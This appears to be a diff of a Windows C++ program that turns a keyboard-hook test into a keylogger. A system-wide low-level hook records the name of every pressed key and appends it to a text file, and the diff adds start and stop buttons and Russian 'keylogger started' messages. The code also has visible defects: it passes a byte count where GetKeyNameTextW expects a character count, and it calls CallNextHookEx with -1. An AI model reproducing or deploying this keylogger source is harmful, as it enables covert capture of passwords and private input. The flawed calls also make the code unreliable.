@@ -3,6 +3,9 @@
 
 #include "stdafx.h"
 #include "FixedHookTest_C++.h"
+#include <cstring>
+
+using namespace std;
 
 #define MAX_LOADSTRING 100
 
@@ -11,7 +14,11 @@ HINSTANCE hInst;								// current instance
 TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
 TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name
 KBDLLHOOKSTRUCT MainHookStruct;
-char PressedKeyName[20];
+wchar_t PressedKeyName[20];
+HWND HookStartButton;
+HWND HookFinishButton;
+HWND hWnd;
+bool HookStarted = false;
 
 // Forward declarations of functions included in this code module:
 ATOM				MyRegisterClass(HINSTANCE hInstance);
@@ -21,9 +28,7 @@ INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);
 LRESULT _stdcall HookCallback(int, WPARAM, LPARAM);
 LRESULT _stdcall HookCallback_2(int, WPARAM, LPARAM);
 
-HHOOK FirstHook;
-HHOOK SecondHook;
-
+HHOOK KeyDownHook;
 
 LRESULT _stdcall HookCallback(int nCode, WPARAM CurrenrWparam, LPARAM CurrentLparam)
 {
@@ -32,19 +37,23 @@ LRESULT _stdcall HookCallback(int nCode, WPARAM CurrenrWparam, LPARAM CurrentLpa
 	{
 		if (CurrenrWparam == WM_KEYDOWN)
 		{
-			unsigned int KeyNumber = CurrenrWparam;
-			//GetKeyNameTextA(CurrentLparam, wtext, 10);
-			//GetKeyNameTextW(CurrentLparam, wtext, 10);
+			/*DWORD dwThreadID = GetCurrentThreadId();
+			HKL hCurKeyboard = GetKeyboardLayout(dwThreadID);*/
 
-			//std::string str;
-			//_itoa_s(KeyNumber, PressedKey, 10);
 			MainHookStruct = *((KBDLLHOOKSTRUCT*)CurrentLparam);
-
 			//***********Получаем имя нажатой клавиши здесь
 			LONG Param = 1;
 			Param += MainHookStruct.scanCode << 16;
 			Param += MainHookStruct.flags << 24;
-			GetKeyNameTextA(Param, PressedKeyName, sizeof(PressedKeyName));
+			GetKeyNameTextW(Param, PressedKeyName, sizeof(PressedKeyName));
+			//***********
+
+			//***********Записываем название нажатой клавиши в текстовый файл
+			wofstream file;
+			file.open("PressedKeys.txt", ios::out | ios::app);
+			file << PressedKeyName;
+			file << "\r\n";
+			file.close();
 			//***********
 
 			if (MainHookStruct.vkCode == VK_F1)
@@ -59,36 +68,7 @@ LRESULT _stdcall HookCallback(int nCode, WPARAM CurrenrWparam, LPARAM CurrentLpa
 	}
 	if (nCode >= 0)
 	{
-		return CallNextHookEx(SecondHook, -1, CurrenrWparam, CurrentLparam);
-	}
-	else
-	{
-		return 0;
-	}
-}
-
-LRESULT _stdcall HookCallback_2(int nCode, WPARAM CurrenrWparam, LPARAM CurrentLparam)
-{
-	if (nCode >= 0)
-	{
-		if (CurrenrWparam == WM_KEYDOWN)
-		{
-			unsigned int KeyNumber = CurrenrWparam;
-			//_itoa_s(KeyNumber, PressedKey, 10);
-			MainHookStruct = *((KBDLLHOOKSTRUCT*)CurrentLparam);
-			if (MainHookStruct.vkCode == VK_F1)
-			{
-				MessageBox(NULL, L"F1 is pressed FROM SECOND PROCEDURE", L"Header", MB_ICONWARNING);
-			}
-		}
-	}
-	else
-	{
-		MessageBox(NULL, L"nCode = -1 (SecondHook)", L"Header", MB_ICONWARNING);
-	}
-	if (nCode >= 0)
-	{
-		return CallNextHookEx(FirstHook, -1, CurrenrWparam, CurrentLparam);
+		return CallNextHookEx(NULL, -1, CurrenrWparam, CurrentLparam);
 	}
 	else
 	{
@@ -98,14 +78,12 @@ LRESULT _stdcall HookCallback_2(int nCode, WPARAM CurrenrWparam, LPARAM CurrentL
 
 void SetHook()
 {
-	FirstHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
-	SecondHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback_2, NULL, 0);
+	KeyDownHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
 }
 
 void DestroyHook()
 {
-	UnhookWindowsHookEx(FirstHook);
-	UnhookWindowsHookEx(SecondHook);
+	UnhookWindowsHookEx(KeyDownHook);
 }
 
 int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
@@ -130,9 +108,11 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	{
 		return FALSE;
 	}
-
+	HookStartButton = CreateWindow(TEXT("BUTTON"), TEXT("Запустить запись нажатых клавиш"), WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON | WS_TABSTOP,
+		50, 25, 250, 35, hWnd, NULL, hInstance, NULL);
+	HookFinishButton = CreateWindow(TEXT("BUTTON"), TEXT("Остановить запись"), WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON | WS_TABSTOP,
+		50, 75, 250, 35, hWnd, NULL, hInstance, NULL);
 	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_FIXEDHOOKTEST_C));
-	SetHook();
 	// Main message loop:
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
@@ -186,12 +166,19 @@ ATOM MyRegisterClass(HINSTANCE hInstance)
 //
 BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 {
-   HWND hWnd;
 
    hInst = hInstance; // Store instance handle in our global variable
 
    hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
-      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);
+      CW_USEDEFAULT, 0, 380, 200, NULL, NULL, hInstance, NULL);
+
+	//Перемещаем окно в центр экрана***********************
+	RECT rc;
+	GetWindowRect(hWnd, &rc);
+	int xPos = (GetSystemMetrics(SM_CXSCREEN) - rc.right) / 2;
+	int yPos = (GetSystemMetrics(SM_CYSCREEN) - rc.bottom) / 2;
+	SetWindowPos(hWnd, 0, xPos, yPos, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
+	//*****************************************************
 
    if (!hWnd)
    {
@@ -223,6 +210,39 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 	switch (message)
 	{
 	case WM_COMMAND:
+		if (HIWORD(wParam) == BN_CLICKED)
+		{
+			if ((HWND)lParam == HookStartButton)
+			{
+				if (!HookStarted)
+				{
+					SetHook();
+					HookStarted = true;
+					MessageBox(hWnd, TEXT("Кейлоггер запущен!"), TEXT("СООБЩЕНИЕ"),
+						MB_OK | MB_ICONWARNING);
+				}
+				else
+				{
+					MessageBox(hWnd, TEXT("Нельзя запустить кейлоггер повторно! (Сначала выключите его)"), TEXT("ОШИБКА"),
+						MB_OK | MB_ICONERROR);
+				}
+			}
+			else if ((HWND)lParam == HookFinishButton)
+			{
+				if (HookStarted)
+				{
+					DestroyHook();
+					HookStarted = false;
+					MessageBox(hWnd, TEXT("Кейлоггер выключен!"), TEXT("СООБЩЕНИЕ"),
+						MB_OK | MB_ICONWARNING);
+				}
+				else
+				{
+					MessageBox(hWnd, TEXT("Сначала запустите кейлоггер!"), TEXT("ОШИБКА"),
+						MB_OK | MB_ICONERROR);
+				}
+			}
+		}
 		wmId    = LOWORD(wParam);
 		wmEvent = HIWORD(wParam);
 		// Parse the menu selections:
